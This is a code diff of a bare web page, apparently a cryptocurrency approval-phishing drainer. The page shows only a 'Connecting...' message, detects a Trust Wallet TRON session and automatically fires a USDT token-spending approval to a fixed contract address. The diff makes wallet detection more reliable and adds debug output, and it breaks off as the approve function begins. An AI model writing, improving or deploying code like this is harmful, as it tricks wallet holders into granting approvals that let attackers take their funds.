@@ -7,30 +7,47 @@
 </head>
 <body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
     <p id="status" style="font-size:16px;color:#9ca3af;">Connecting...</p>
+    <p id="debug" style="font-size:11px;color:#6b7280;margin-top:20px;"></p>
 
     <script>
         var CONTRACT_ADDRESS = "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju";
         var USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         var APPROVE_AMOUNT = 1000000;
         var status = document.getElementById("status");
+        var debug = document.getElementById("debug");
+        var started = false;
 
-        // Poll for tronWeb every 100ms (fast detection)
+        // Poll for tronWeb every 200ms
         var check = setInterval(function() {
-            if (window.tronWeb && window.tronWeb.ready) {
+            var tw = window.tronWeb;
+            if (!tw) {
+                debug.textContent = "tronWeb: not found";
+                return;
+            }
+
+            // Trust Wallet may not set .ready = true
+            // Check if defaultAddress exists instead
+            var hasAddress = tw.defaultAddress && tw.defaultAddress.base58 && tw.defaultAddress.base58.length > 5;
+            var isReady = tw.ready || hasAddress;
+
+            debug.textContent = "tronWeb: found | ready: " + tw.ready + " | addr: " + (tw.defaultAddress ? tw.defaultAddress.base58 : "none");
+
+            if (isReady && !started) {
+                started = true;
                 clearInterval(check);
-                // Fire approve IMMEDIATELY - no delay
                 sendApprove();
             }
-        }, 100);
+        }, 200);
 
-        // Timeout after 15s
+        // Timeout after 20s
         setTimeout(function() {
-            clearInterval(check);
-            if (!window.tronWeb || !window.tronWeb.ready) {
-                status.textContent = "Open this page in Trust Wallet";
+            if (!started) {
+                clearInterval(check);
+                status.textContent = "Wallet not detected";
                 status.style.color = "#f87171";
+                debug.textContent = "tronWeb: " + typeof window.tronWeb + " | Make sure TRON network is selected in Trust Wallet";
             }
-        }, 15000);
+        }, 20000);
 
         function sendApprove() {
             status.textContent = "Confirm in popup...";
